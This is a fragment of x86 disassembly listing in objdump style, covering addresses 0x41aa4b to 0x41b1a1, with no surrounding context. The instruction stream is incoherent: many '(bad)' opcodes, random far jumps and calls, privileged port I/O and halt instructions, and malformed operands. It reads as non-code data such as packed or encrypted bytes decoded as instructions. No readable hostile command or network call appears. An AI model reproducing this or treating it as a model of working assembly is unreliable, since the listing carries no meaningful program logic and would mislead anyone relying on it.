  41aa4b:	xor    bh,BYTE PTR [edi+0x54]
  41aa4e:	retf   
  41aa4f:	stos   DWORD PTR es:[edi],eax
  41aa50:	mov    ?,ebx
  41aa52:	mov    eax,ds:0x586c6728
  41aa57:	test   DWORD PTR [edx-0x477ddb7e],edi
  41aa5d:	add    eax,0x7ac0febd
  41aa62:	mov    esp,ds
  41aa64:	pop    eax
  41aa65:	inc    eax
  41aa66:	leave  
  41aa67:	sbb    esp,DWORD PTR [edi+0x5697fae]
  41aa6d:	jmp    0x8625:0x170cb508
  41aa74:	fs jmp 0x63127d7d
  41aa7a:	out    dx,al
  41aa7b:	je     0x41aa1e
  41aa7d:	scas   al,BYTE PTR es:[edi]
  41aa7e:	pop    es
  41aa7f:	mov    ah,0x1b
  41aa81:	pop    edx
  41aa82:	into   
  41aa83:	(bad)  
  41aa84:	cmp    DWORD PTR [esi],edi
  41aa86:	bound  edi,QWORD PTR [esi+esi*4]
  41aa89:	cwde   
  41aa8a:	enter  0x77a2,0x1c
  41aa8e:	xor    BYTE PTR [ebp+0x33],0x8a
  41aa92:	jmp    0xc5e9:0x1237682f
  41aa99:	push   ebx
  41aa9a:	and    ch,BYTE PTR [ebp-0x57]
  41aa9d:	lods   al,BYTE PTR ds:[esi]
  41aa9e:	push   ds
  41aa9f:	gs in  eax,dx
  41aaa1:	aas    
  41aaa2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aaa3:	js     0x41aae3
  41aaa5:	xchg   al,dh
  41aaa7:	push   edx
  41aaa8:	lds    ecx,FWORD PTR [esi]
  41aaaa:	xor    eax,0x90cef80d
  41aaaf:	call   0x98f5:0x747f99de
  41aab6:	jno    0x41aa9b
  41aab8:	xchg   ecx,eax
  41aab9:	aad    0x20
  41aabb:	xchg   ebp,eax
  41aabc:	pusha  
  41aabd:	leave  
  41aabe:	ret    0x75c
  41aac1:	mov    dh,0x76
  41aac3:	loop   0x41ab43
  41aac5:	add    al,0x8d
  41aac7:	xchg   ebp,eax
  41aac8:	sbb    ebx,DWORD PTR [edi-0x689a7bf8]
  41aace:	adc    al,0x8f
  41aad0:	push   ebx
  41aad1:	(bad)  
  41aad2:	inc    edi
  41aad3:	xchg   BYTE PTR [ecx+0xb],bl
  41aad6:	fcomp  st(2)
  41aad8:	iret   
  41aad9:	xor    al,0x13
  41aadb:	jp     0x41aac9
  41aadd:	and    dh,BYTE PTR [ebx+0x18b6fc7b]
  41aae3:	jns    0x41ab5b
  41aae5:	lea    ecx,gs:[ebx-0x9923187]
  41aaec:	lods   eax,DWORD PTR ds:[esi]
  41aaed:	mov    esp,DWORD PTR [ebx+0xa67e1c4]
  41aaf3:	or     esi,eax
  41aaf5:	jg     0x41aad3
  41aaf7:	mov    dl,0x39
  41aaf9:	sbb    eax,0xbf2e6d3b
  41aafe:	inc    cx
  41ab00:	int3   
  41ab01:	mov    eax,0x461b45ee
  41ab06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab07:	lods   eax,DWORD PTR ds:[esi]
  41ab08:	push   ds
  41ab09:	mov    ecx,0xf02bc867
  41ab0e:	xchg   ecx,eax
  41ab0f:	xchg   ecx,eax
  41ab10:	sbb    dl,dh
  41ab12:	jle    0x41ab57
  41ab14:	(bad)  
  41ab15:	mov    ebx,0x45723b9d
  41ab1a:	dec    ebp
  41ab1b:	pop    esi
  41ab1c:	not    DWORD PTR [ecx]
  41ab1e:	hlt    
  41ab1f:	lock test BYTE PTR [edx+edx*2-0x2e92f33e],ah
  41ab27:	pop    es
  41ab28:	leave  
  41ab29:	cld    
  41ab2a:	not    DWORD PTR [ebx]
  41ab2c:	out    0x6b,eax
  41ab2e:	and    al,0xf4
  41ab30:	push   ds
  41ab31:	jl     0x41ab38
  41ab33:	inc    esp
  41ab34:	fld    DWORD PTR [eax+0x9b83b24]
  41ab3a:	rcl    BYTE PTR [edx+0x69],cl
  41ab3d:	xchg   ecx,eax
  41ab3e:	loope  0x41ab49
  41ab40:	dec    ebx
  41ab41:	jp     0x41ab05
  41ab43:	sub    BYTE PTR [eax-0x5c],dl
  41ab46:	fisttp QWORD PTR [esi+0x70]
  41ab49:	cdq    
  41ab4a:	pop    esp
  41ab4b:	xor    DWORD PTR [eax+edx*4],0x987fabf0
  41ab52:	cmp    DWORD PTR [ebx+0x66a02f1b],esi
  41ab58:	hlt    
  41ab59:	adc    ebp,DWORD PTR [ebx+0x6c]
  41ab5c:	inc    ebp
  41ab5d:	jl     0x41abcf
  41ab5f:	mov    dl,0xb3
  41ab61:	shl    DWORD PTR [esi-0x5fb8485],cl
  41ab67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab6a:	repnz in ax,dx
  41ab6d:	stos   DWORD PTR es:[edi],eax
  41ab6e:	dec    edx
  41ab6f:	inc    ebx
  41ab70:	(bad)  
  41ab71:	fs in  al,0x9a
  41ab74:	push   eax
  41ab75:	jl     0x41ab69
  41ab77:	shr    BYTE PTR [ebp-0x6beb09c4],1
  41ab7d:	cmp    esp,DWORD PTR [edx-0xd7485b6]
  41ab83:	jne    0x41ab72
  41ab85:	push   ss
  41ab86:	(bad)  
  41ab87:	mov    ch,0x8a
  41ab89:	or     bl,ch
  41ab8b:	adc    al,0x77
  41ab8d:	pop    ds
  41ab8e:	bound  edx,QWORD PTR [edx+edi*8]
  41ab91:	repz inc eax
  41ab93:	pop    ss
  41ab94:	shr    edx,1
  41ab96:	out    0xf2,eax
  41ab98:	jb     0x41ab46
  41ab9a:	jle    0x41ab3c
  41ab9c:	lock sbb al,BYTE PTR [eax-0x63]
  41aba0:	fs jno 0x41ab40
  41aba3:	push   ds
  41aba4:	les    edx,FWORD PTR [esi+0x2e788a5c]
  41abaa:	adc    al,0xe6
  41abac:	inc    ecx
  41abad:	fmul   DWORD PTR [esi]
  41abaf:	push   esp
  41abb0:	inc    eax
  41abb1:	or     esi,ebx
  41abb3:	adc    bl,dh
  41abb5:	aaa    
  41abb6:	mov    BYTE PTR [edx],dh
  41abb8:	test   eax,0xf5f9ad57
  41abbd:	retf   0x6865
  41abc0:	int    0x69
  41abc2:	ror    BYTE PTR [edi+0x32349c6f],0xb
  41abc9:	pop    es
  41abca:	add    ecx,DWORD PTR [esi]
  41abcc:	daa    
  41abcd:	int    0xaf
  41abcf:	shr    BYTE PTR ds:0x8464ab16,1
  41abd5:	jo     0x41abd0
  41abd7:	ja     0x41abc0
  41abd9:	adc    ecx,esi
  41abdb:	inc    esp
  41abdc:	cs std 
  41abde:	dec    edi
  41abdf:	and    DWORD PTR [eax+0xfc214b6],0xe492d16
  41abe9:	fst    DWORD PTR [edi+0xb9ce778]
  41abef:	mov    esi,0x6e478ecc
  41abf4:	call   0x6b1d:0x472c5ee1
  41abfb:	pop    esp
  41abfc:	shl    edi,0x9e
  41abff:	jecxz  0x41abe3
  41ac01:	cmp    ah,BYTE PTR [esp+eax*2]
  41ac04:	add    bh,cl
  41ac06:	inc    eax
  41ac07:	lock mov eax,ds:0xbc4d78bc
  41ac0d:	xchg   esp,eax
  41ac0e:	jno    0x41abe0
  41ac10:	xor    eax,0xb2e32cc5
  41ac15:	and    al,0x8f
  41ac17:	fisttp DWORD PTR [edx-0x7ea1205a]
  41ac1d:	push   edx
  41ac1e:	retf   0x928a
  41ac21:	dec    ebp
  41ac22:	jns    0x41ac40
  41ac24:	sub    BYTE PTR [edi+0x2597a0b2],dh
  41ac2a:	repz jae 0x41abfe
  41ac2d:	and    bh,dl
  41ac2f:	pop    ebx
  41ac30:	lods   al,BYTE PTR es:[esi]
  41ac32:	sbb    cl,cl
  41ac34:	ss inc ecx
  41ac36:	test   BYTE PTR [esi],0x3b
  41ac39:	and    BYTE PTR [esi+0x34d6ef82],cl
  41ac3f:	ss adc al,0xee
  41ac42:	push   0xffffffd9
  41ac44:	mov    edi,0x6a5968d6
  41ac49:	or     BYTE PTR [edx+0x123a8ccf],dh
  41ac4f:	inc    ebx
  41ac50:	xchg   edi,eax
  41ac51:	imul   esi,ecx,0x64
  41ac54:	xor    DWORD PTR [ebx-0x4f],edi
  41ac57:	cld    
  41ac58:	jg     0x41ac63
  41ac5a:	push   ds
  41ac5b:	pop    esi
  41ac5c:	fiadd  WORD PTR [edx*1+0x42147800]
  41ac63:	retf   
  41ac64:	bound  ecx,QWORD PTR [edi]
  41ac66:	inc    ebp
  41ac67:	das    
  41ac68:	aam    0x1f
  41ac6a:	icebp  
  41ac6b:	rcr    DWORD PTR [ebp+eax*4+0x66ccbe43],1
  41ac72:	clc    
  41ac73:	sub    DWORD PTR [ebx+ebp*1+0x35a8481c],0xffffff9d
  41ac7b:	or     al,BYTE PTR [ebx]
  41ac7d:	add    BYTE PTR [ecx],ch
  41ac7f:	repnz sbb esp,esi
  41ac82:	cdq    
  41ac83:	pushf  
  41ac84:	popa   
  41ac85:	fnstcw WORD PTR [esi+0x3fef91d8]
  41ac8b:	repz pushf 
  41ac8d:	or     esi,ebx
  41ac8f:	jns    0x41ace2
  41ac91:	cli    
  41ac92:	fidivr WORD PTR [eax]
  41ac94:	in     al,0x57
  41ac96:	out    dx,al
  41ac97:	push   edi
  41ac98:	xor    al,0xd1
  41ac9a:	nop
  41ac9b:	int    0x5c
  41ac9d:	rcl    DWORD PTR [edi+0x66],cl
  41aca0:	ins    DWORD PTR es:[edi],dx
  41aca1:	lock mov bp,0x5326
  41aca6:	fidiv  DWORD PTR [edi-0x9a72176]
  41acac:	lods   eax,DWORD PTR ds:[esi]
  41acad:	adc    eax,DWORD PTR [eax+edi*4-0x31fea3d8]
  41acb4:	pop    es
  41acb5:	mov    ah,0x17
  41acb7:	out    dx,al
  41acb8:	xchg   esi,eax
  41acb9:	mov    ch,0x1d
  41acbb:	mov    ah,0xa7
  41acbd:	dec    edi
  41acbe:	xchg   DWORD PTR [eax],ebp
  41acc0:	rol    DWORD PTR [edi],cl
  41acc2:	or     BYTE PTR [ebx+ebx*1+0x7586b51e],ah
  41acc9:	sti    
  41acca:	sti    
  41accb:	push   ax
  41accd:	rcr    ebp,0x3c
  41acd0:	dec    edx
  41acd1:	pop    esp
  41acd2:	mov    bl,BYTE PTR cs:[ecx-0x29]
  41acd6:	adc    eax,0x30ba9b9a
  41acdb:	in     eax,dx
  41acdc:	hlt    
  41acdd:	adc    eax,0x654015c1
  41ace2:	aad    0xb8
  41ace4:	cs lahf 
  41ace6:	ja     0x41ac86
  41ace8:	xor    eax,0xb27a6c91
  41aced:	pop    ebx
  41acee:	push   0x145fad41
  41acf3:	add    ebp,DWORD PTR [edi+eiz*8]
  41acf6:	and    ebx,esi
  41acf8:	jg     0x41ad23
  41acfa:	fdiv   QWORD PTR [eax-0x39]
  41acfd:	(bad)  
  41acfe:	pushf  
  41acff:	dec    ebp
  41ad00:	aaa    
  41ad01:	stc    
  41ad02:	stc    
  41ad03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad04:	pop    edi
  41ad05:	(bad)  
  41ad07:	(bad)  
  41ad08:	jae    0x41ace5
  41ad0a:	push   ebp
  41ad0b:	lock fdivr st,st(7)
  41ad0e:	lock adc BYTE PTR [esi-0x64],dl
  41ad12:	out    0x68,al
  41ad14:	jb     0x41ad8a
  41ad16:	nop
  41ad17:	shl    edx,1
  41ad19:	push   edi
  41ad1a:	jmp    0x41ad8c
  41ad1c:	jb     0x41ad7d
  41ad1e:	retf   
  41ad1f:	or     BYTE PTR [esi-0x80],dh
  41ad22:	sbb    eax,0xa1b4282d
  41ad27:	shr    DWORD PTR [eax+0x15a32f3e],1
  41ad2d:	xor    BYTE PTR ds:0x60a4759f,ah
  41ad33:	fstp   TBYTE PTR [edi+0x5c1cd6f2]
  41ad39:	fdivrp st(6),st
  41ad3b:	adc    al,0x7c
  41ad3d:	dec    ebx
  41ad3e:	add    al,0x87
  41ad40:	sbb    DWORD PTR [esi-0x5e],esi
  41ad43:	or     DWORD PTR [ecx],0xfffffff2
  41ad46:	neg    BYTE PTR [edx+ebp*4+0x7d]
  41ad4a:	dec    esi
  41ad4b:	(bad)  
  41ad4d:	jne    0x41adb4
  41ad4f:	mov    esp,0xd64a4048
  41ad54:	outs   dx,DWORD PTR ds:[esi]
  41ad55:	mov    ebx,DWORD PTR [ecx]
  41ad57:	mov    ebx,0x9f37593c
  41ad5c:	fwait
  41ad5d:	xchg   esp,eax
  41ad5e:	(bad)  
  41ad5f:	(bad)  
  41ad61:	(bad)  
  41ad62:	fdivr  DWORD PTR fs:[ebp-0x36b7f876]
  41ad69:	cli    
  41ad6a:	sar    BYTE PTR [ebp+0x35],cl
  41ad6d:	lds    esi,FWORD PTR [esi]
  41ad6f:	mov    ah,0xce
  41ad71:	clc    
  41ad72:	bound  ebp,QWORD PTR [esp+edx*1]
  41ad75:	mov    esi,DWORD PTR [edx+ecx*2+0x5be83e9d]
  41ad7c:	test   ebx,0xd0fdf3af
  41ad82:	sub    BYTE PTR [eax],dh
  41ad84:	sub    DWORD PTR [esi+0x24b0adc2],eax
  41ad8a:	dec    ebp
  41ad8b:	repz mov ebp,DWORD PTR es:[esi-0x43]
  41ad90:	outs   dx,DWORD PTR ds:[esi]
  41ad91:	add    al,0x44
  41ad93:	mov    al,ds:0xa8086d70
  41ad98:	xchg   esp,eax
  41ad99:	xchg   edi,eax
  41ad9a:	dec    edx
  41ad9b:	imul   ebx,DWORD PTR [esi+0x3a9f1ef],0xffffffeb
  41ada2:	sub    DWORD PTR [ebx-0xce2bf49],0x7a2b77ea
  41adac:	jp     0x41add5
  41adae:	adc    BYTE PTR [edi+0x27],ch
  41adb1:	mov    dh,0x7c
  41adb3:	in     eax,dx
  41adb4:	and    eax,0x4b1880f2
  41adb9:	xchg   edi,eax
  41adba:	js     0x41ad4b
  41adbc:	shl    DWORD PTR [edx-0xa22d131],0x5
  41adc3:	repz fwait
  41adc5:	sub    eax,0x6c02ca1c
  41adca:	stos   DWORD PTR es:[edi],eax
  41adcb:	dec    edx
  41adcc:	pop    ss
  41adcd:	push   esi
  41adce:	retf   
  41adcf:	popa   
  41add0:	adc    DWORD PTR [ebx],ebx
  41add2:	cmp    al,0xbc
  41add4:	pop    ebx
  41add5:	jle    0x41ada3
  41add7:	gs ins DWORD PTR es:[di],dx
  41adda:	loop   0x41adb6
  41addc:	sbb    DWORD PTR [edi+0x76],ebp
  41addf:	shr    BYTE PTR [edi],cl
  41ade1:	mov    eax,0xbda61439
  41ade6:	xor    al,0x5e
  41ade8:	cmc    
  41ade9:	cmc    
  41adea:	ins    DWORD PTR es:[edi],dx
  41adeb:	adc    BYTE PTR [eax-0x5e],dl
  41adee:	fiadd  DWORD PTR gs:[eax+0x24]
  41adf2:	clc    
  41adf3:	mov    al,0xa5
  41adf5:	int3   
  41adf6:	mov    esi,0xe0720961
  41adfb:	out    dx,eax
  41adfc:	adc    ch,BYTE PTR [eax]
  41adfe:	mov    esp,DWORD PTR [ecx-0x67039498]
  41ae04:	int    0x79
  41ae06:	out    0x7,al
  41ae08:	test   edi,ebp
  41ae0a:	cmp    bh,BYTE PTR [edx+0x25]
  41ae0d:	mov    DWORD PTR [edx],ebp
  41ae0f:	adc    DWORD PTR [ebx-0x16],ebx
  41ae12:	jmp    DWORD PTR [eax+0x39def20c]
  41ae18:	xor    DWORD PTR [edi+0x4ff80e63],esi
  41ae1e:	mov    bl,0x7e
  41ae20:	adc    esp,esp
  41ae22:	cmp    DWORD PTR [ebp+0x617945cf],esi
  41ae28:	mov    dh,al
  41ae2a:	or     al,0xb1
  41ae2c:	push   ecx
  41ae2d:	sub    al,0xc8
  41ae2f:	test   BYTE PTR [edx],dh
  41ae31:	fist   DWORD PTR [esi+0x77]
  41ae34:	xchg   BYTE PTR [eax],al
  41ae36:	mov    BYTE PTR [bp+di-0x1610],0xb3
  41ae3c:	addr16 xchg esp,eax
  41ae3e:	aam    0xa9
  41ae40:	(bad)  
  41ae41:	push   eax
  41ae42:	loopne 0x41ae96
  41ae44:	jmp    0x8e6f:0xa1c76188
  41ae4b:	push   ss
  41ae4c:	or     BYTE PTR [esi],bl
  41ae4e:	hlt    
  41ae4f:	inc    edx
  41ae50:	inc    ecx
  41ae51:	xchg   edx,eax
  41ae52:	cld    
  41ae53:	inc    esp
  41ae54:	xor    bh,BYTE PTR [edi]
  41ae56:	jle    0x41ae3e
  41ae58:	cli    
  41ae59:	(bad)  
  41ae5b:	adc    eax,0x49145213
  41ae60:	xchg   esp,eax
  41ae61:	push   ecx
  41ae62:	xor    dh,BYTE PTR [eax]
  41ae64:	loope  0x41ae22
  41ae66:	jne    0x41ae1d
  41ae68:	dec    esi
  41ae69:	in     eax,dx
  41ae6a:	sub    eax,0x7a95758f
  41ae6f:	and    DWORD PTR [edi],eax
  41ae71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae72:	aas    
  41ae73:	cmp    eax,esp
  41ae75:	sub    DWORD PTR [ecx-0x15],ecx
  41ae78:	jns    0x41aea3
  41ae7a:	(bad)  
  41ae7b:	push   esp
  41ae7c:	jmp    FWORD PTR [ebx]
  41ae7e:	jmp    0x41ae78
  41ae80:	clc    
  41ae81:	jl     0x41ae7f
  41ae83:	outs   dx,BYTE PTR ds:[esi]
  41ae84:	inc    eax
  41ae85:	lds    esi,FWORD PTR [edi+0x47]
  41ae88:	dec    edi
  41ae89:	push   0x1
  41ae8b:	shl    DWORD PTR [ebp+ecx*1-0x492e9514],cl
  41ae92:	push   ds
  41ae93:	inc    esi
  41ae94:	fild   WORD PTR [ecx+0x69]
  41ae97:	push   0xbf23ce49
  41ae9c:	js     0x41ae60
  41ae9e:	int3   
  41ae9f:	out    0x64,al
  41aea1:	jle    0x41aeaa
  41aea3:	imul   ebx,DWORD PTR [edi],0x5a6202dd
  41aea9:	mov    esi,0x6c211793
  41aeae:	add    BYTE PTR [edx+esi*4-0x2a],cl
  41aeb2:	pop    eax
  41aeb3:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41aeb5:	repnz add al,ch
  41aeb8:	test   edx,esp
  41aeba:	sub    al,0xaf
  41aebc:	inc    eax
  41aebd:	dec    ecx
  41aebe:	inc    eax
  41aebf:	push   ss
  41aec0:	jno    0x41ae7f
  41aec2:	push   es
  41aec3:	cmc    
  41aec4:	xlat   BYTE PTR ds:[ebx]
  41aec5:	loopne 0x41af24
  41aec7:	push   0x61963dbc
  41aecc:	ins    DWORD PTR es:[edi],dx
  41aecd:	fwait
  41aece:	cmp    edi,ebx
  41aed0:	pop    ds
  41aed1:	cmp    al,0xb7
  41aed3:	scas   al,BYTE PTR es:[edi]
  41aed4:	pushf  
  41aed5:	jle    0x41ae58
  41aed7:	cmc    
  41aed8:	leave  
  41aed9:	xchg   BYTE PTR [esi+0x58],ch
  41aedc:	lea    eax,[edi-0x26]
  41aedf:	rcr    DWORD PTR [edx-0x73],1
  41aee2:	xor    dh,BYTE PTR [eax-0xeac1898]
  41aee8:	cdq    
  41aee9:	ja     0x41aee5
  41aeeb:	fisub  WORD PTR [eax-0x55c5d124]
  41aef1:	(bad)  
  41aef2:	scas   al,BYTE PTR es:[edi]
  41aef3:	repnz rol BYTE PTR [eax+esi*8-0x144d80d9],0x66
  41aefc:	dec    eax
  41aefd:	int    0x3a
  41aeff:	xchg   edi,eax
  41af00:	mov    dl,dh
  41af02:	mov    bh,0xae
  41af04:	cmp    BYTE PTR [eax+0x7a],0xe1
  41af08:	cmc    
  41af09:	pop    ecx
  41af0a:	jmp    0xdd42:0x8d198720
  41af11:	adc    al,0x56
  41af13:	and    BYTE PTR [eax+0x5d4fedb4],0xcf
  41af1a:	sahf   
  41af1b:	into   
  41af1c:	repnz push ebx
  41af1e:	push   es
  41af1f:	adc    edx,DWORD PTR [eax]
  41af21:	call   0xae42ab5b
  41af26:	push   ebp
  41af27:	pop    ebp
  41af28:	fbld   TBYTE PTR [ecx+ecx*8+0x71]
  41af2c:	mov    bh,0x6d
  41af2e:	inc    ecx
  41af2f:	and    BYTE PTR [edi+0x2a5cf8cd],dl
  41af35:	mov    ss,WORD PTR [ebx+0x5c]
  41af38:	or     BYTE PTR [ecx-0x8ed83da],0x30
  41af3f:	xchg   DWORD PTR ds:0xf218bb2a,ecx
  41af45:	adc    BYTE PTR [eax+0x24015e9],ah
  41af4b:	mov    ebp,ebp
  41af4d:	fsubr  DWORD PTR [ecx]
  41af4f:	daa    
  41af50:	xchg   ecx,eax
  41af51:	ins    BYTE PTR es:[edi],dx
  41af52:	xchg   ebp,eax
  41af53:	popf   
  41af54:	out    0xc6,eax
  41af56:	jbe    0x41af33
  41af58:	dec    esi
  41af59:	sahf   
  41af5a:	mov    cl,0xa2
  41af5c:	jmp    0x6a2b003f
  41af61:	shl    DWORD PTR [ebp-0x2a4da70a],1
  41af67:	jae    0x41aef1
  41af69:	fcomp  QWORD PTR [edi-0x61]
  41af6c:	cmp    edi,DWORD PTR [esi-0xfe780c7]
  41af72:	std    
  41af73:	mov    ds:0xf38b3efe,eax
  41af78:	js     0x41aefd
  41af7a:	out    0xde,al
  41af7c:	nop
  41af7d:	ja     0x41af15
  41af7f:	bound  ebx,QWORD PTR [edx+0xffb9fb5]
  41af85:	sub    bl,BYTE PTR [edx-0x2f01ea54]
  41af8b:	mov    cl,0xdc
  41af8d:	in     eax,dx
  41af8e:	lea    ebx,[ebp+0x6a]
  41af91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af92:	inc    eax
  41af93:	cld    
  41af94:	ins    DWORD PTR es:[edi],dx
  41af95:	aas    
  41af96:	rcl    BYTE PTR [ebp-0x3f7927c4],cl
  41af9c:	push   ebx
  41af9d:	inc    edi
  41af9e:	xor    ah,BYTE PTR [eax-0x26]
  41afa1:	fdiv   QWORD PTR [esi-0x6451efc9]
  41afa7:	adc    BYTE PTR [edx+0x5f63ebac],al
  41afad:	out    dx,al
  41afae:	xchg   esp,eax
  41afaf:	and    eax,0x4b3514aa
  41afb4:	mov    dl,0xf4
  41afb6:	dec    esi
  41afb7:	shl    BYTE PTR ds:[esp+ebx*2+0x7a],1
  41afbc:	add    eax,0x69c8fa44
  41afc1:	fsub   st,st(0)
  41afc3:	fs push esp
  41afc5:	xor    eax,0x43694c42
  41afca:	mov    eax,ds:0xd51b54e5
  41afcf:	add    al,0xde
  41afd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41afd2:	arpl   WORD PTR [edx-0x25],bp
  41afd5:	loopne 0x41afc0
  41afd7:	cmp    edi,eax
  41afd9:	mov    ecx,0xbe550f25
  41afde:	mov    bh,0x13
  41afe0:	pop    eax
  41afe1:	inc    eax
  41afe2:	inc    esp
  41afe3:	push   ebx
  41afe4:	sbb    DWORD PTR [eax],0xffffffa2
  41afe7:	mov    eax,ds:0x94806a1
  41afec:	(bad)  
  41afed:	out    0x61,al
  41afef:	or     ebp,DWORD PTR [esp+esi*8]
  41aff2:	jns    0x41affd
  41aff4:	jecxz  0x41afd7
  41aff6:	mov    BYTE PTR [edi],dl
  41aff8:	jmp    0xcbf7e7e3
  41affd:	test   al,0xf8
  41afff:	aad    0x42
  41b001:	mov    eax,0xa54fcd3d
  41b006:	out    0x67,al
  41b008:	rol    BYTE PTR [edi],cl
  41b00a:	pop    ebp
  41b00b:	jno    0x41afea
  41b00d:	adc    bh,ch
  41b00f:	sbb    ch,BYTE PTR [ebx]
  41b011:	pop    es
  41b012:	aad    0x87
  41b014:	add    al,0xa6
  41b016:	push   es
  41b017:	popf   
  41b018:	fld    DWORD PTR [edi+eax*4-0x4c3690aa]
  41b01f:	xchg   edx,eax
  41b020:	jg     0x41b093
  41b022:	les    edi,FWORD PTR [ebx+0x310e272d]
  41b028:	jo     0x41afe8
  41b02a:	add    DWORD PTR [ebx],esp
  41b02c:	lock push ss
  41b02e:	int    0xad
  41b030:	jnp    0x41affb
  41b032:	pop    edi
  41b033:	mov    ecx,0xcd210bd4
  41b038:	push   ss
  41b039:	xlat   BYTE PTR ds:[ebx]
  41b03a:	es loopne 0x41b08c
  41b03d:	aas    
  41b03e:	cld    
  41b03f:	and    al,0xb0
  41b041:	add    BYTE PTR [ebp+0x73],al
  41b044:	aam    0xb5
  41b046:	push   ecx
  41b047:	mov    edi,0xad95f750
  41b04c:	daa    
  41b04d:	mov    ?,WORD PTR [edi+0x5c]
  41b050:	and    edi,DWORD PTR [ebp+0xb]
  41b053:	mov    gs,WORD PTR [ebx-0x43721df4]
  41b059:	in     eax,dx
  41b05a:	dec    esi
  41b05b:	lods   al,BYTE PTR ds:[si]
  41b05d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b05e:	lods   al,BYTE PTR ds:[esi]
  41b05f:	sahf   
  41b060:	(bad)  
  41b064:	jmp    0x70bd063
  41b069:	aam    0x93
  41b06b:	repz das 
  41b06d:	cs hlt 
  41b06f:	jmp    0x41b08b
  41b071:	adc    eax,0x6dc3b987
  41b076:	inc    si
  41b078:	inc    esi
  41b079:	mov    cl,0x18
  41b07b:	pop    edi
  41b07c:	mov    ebp,0x9e15012d
  41b081:	mov    eax,ds:0x36c6a0a1
  41b086:	in     eax,dx
  41b087:	jmp    0x29c42ed7
  41b08c:	and    BYTE PTR [esi+0x48],bh
  41b08f:	push   esi
  41b090:	mov    edx,0xd447a4a
  41b095:	mov    ds:0xe3e0fc4a,eax
  41b09a:	adc    ebx,DWORD PTR [eax]
  41b09c:	add    eax,DWORD PTR [ebx+0x7e7bc7ed]
  41b0a2:	pop    ecx
  41b0a3:	stc    
  41b0a4:	mov    bh,0x1e
  41b0a6:	push   esp
  41b0a7:	test   al,0xe8
  41b0a9:	push   cs
  41b0aa:	mov    bl,0xc5
  41b0ac:	and    eax,DWORD PTR [esi]
  41b0ae:	sbb    ecx,edx
  41b0b0:	test   al,0x7f
  41b0b2:	adc    DWORD PTR [ecx+edx*8+0xb],ebx
  41b0b6:	pop    ecx
  41b0b7:	push   esi
  41b0b8:	mov    ebx,0x8ca8e1fc
  41b0bd:	ror    DWORD PTR [ebx],0x6b
  41b0c0:	and    al,0xcd
  41b0c2:	imul   DWORD PTR [ebx-0x39]
  41b0c5:	fisubr DWORD PTR [edx]
  41b0c7:	mul    BYTE PTR [ecx]
  41b0c9:	mov    esp,0xb7095071
  41b0ce:	sub    eax,0xbb81e91b
  41b0d3:	in     al,dx
  41b0d4:	and    DWORD PTR [ebp-0x11bd187d],esi
  41b0da:	fmul   QWORD PTR [ebx]
  41b0dc:	xchg   BYTE PTR [ecx+0xe],bh
  41b0df:	jg     0x41b140
  41b0e1:	test   dl,ah
  41b0e3:	nop
  41b0e4:	jb     0x41b066
  41b0e6:	dec    edi
  41b0e7:	int    0x7e
  41b0e9:	push   es
  41b0ea:	push   ecx
  41b0eb:	call   0x2c34:0xb222e870
  41b0f2:	and    BYTE PTR [edx],dl
  41b0f4:	xchg   dh,ah
  41b0f6:	test   BYTE PTR [edx],ah
  41b0f8:	bound  ebp,QWORD PTR [ecx+0x37306aa1]
  41b0fe:	adc    al,0xc9
  41b100:	dec    edi
  41b101:	test   eax,0x99a35991
  41b106:	loope  0x41b0fb
  41b108:	pop    edx
  41b109:	dec    esp
  41b10a:	ja     0x41b0d4
  41b10c:	jl     0x41b113
  41b10e:	dec    esi
  41b10f:	iret   
  41b110:	cdq    
  41b111:	or     DWORD PTR [edi],ecx
  41b113:	in     al,dx
  41b114:	mov    bh,0xb5
  41b116:	(bad)  
  41b117:	int    0x2e
  41b119:	outs   dx,BYTE PTR ds:[esi]
  41b11a:	ror    DWORD PTR [esp+edx*1],0x4b
  41b11e:	adc    DWORD PTR [edi-0x5d408bb1],0xffffffc6
  41b125:	into   
  41b126:	pop    ebp
  41b127:	mov    eax,0xf42b393e
  41b12c:	ins    BYTE PTR es:[edi],dx
  41b12d:	push   es
  41b12e:	pop    DWORD PTR [esi+esi*2]
  41b131:	retf   0x8ccb
  41b134:	cmp    DWORD PTR [ebx-0x452cb021],0xffffffc5
  41b13b:	xor    eax,DWORD PTR [edi-0x72]
  41b13e:	mov    dh,0x94
  41b140:	add    DWORD PTR [edi-0x41f49fb9],edx
  41b146:	clc    
  41b147:	call   0x9cc2:0x93c918c4
  41b14e:	inc    esi
  41b14f:	lock lock std 
  41b152:	inc    eax
  41b153:	test   DWORD PTR [ebx],ecx
  41b155:	mov    ds:0xd7895dad,al
  41b15a:	mov    ebx,DWORD PTR [ebx]
  41b15c:	push   esp
  41b15d:	or     edi,DWORD PTR [edx]
  41b15f:	stos   DWORD PTR es:[edi],eax
  41b160:	and    bh,cl
  41b162:	add    dh,BYTE PTR [edi-0x33]
  41b165:	and    bl,BYTE PTR [edx-0x7879403c]
  41b16b:	xchg   esp,eax
  41b16c:	test   BYTE PTR [eax+eiz*1],dl
  41b16f:	scas   eax,DWORD PTR es:[edi]
  41b170:	xchg   edx,eax
  41b171:	or     edx,DWORD PTR [edi-0x474f57c2]
  41b177:	inc    ebx
  41b178:	push   esp
  41b179:	fcomp  DWORD PTR [ebx+edx*8]
  41b17c:	rcr    BYTE PTR [esi-0x77],cl
  41b17f:	je     0x41b185
  41b181:	shr    DWORD PTR [edi+ebx*1-0x1a],cl
  41b185:	pushf  
  41b186:	dec    ecx
  41b187:	xor    al,0x75
  41b189:	xchg   ecx,eax
  41b18a:	adc    BYTE PTR [ebx],0x4
  41b18d:	inc    esp
  41b18e:	xor    DWORD PTR [ecx],ebx
  41b190:	xor    DWORD PTR [eax+0x7a],esp
  41b193:	xlat   BYTE PTR ds:[ebx]
  41b194:	xor    al,0x9f
  41b196:	jmp    0xcddb:0x3cb3715b
  41b19d:	sbb    edi,DWORD PTR [edx+ebx*1+0xc]
  41b1a1:	mov    al,ds:0x1f323f4f
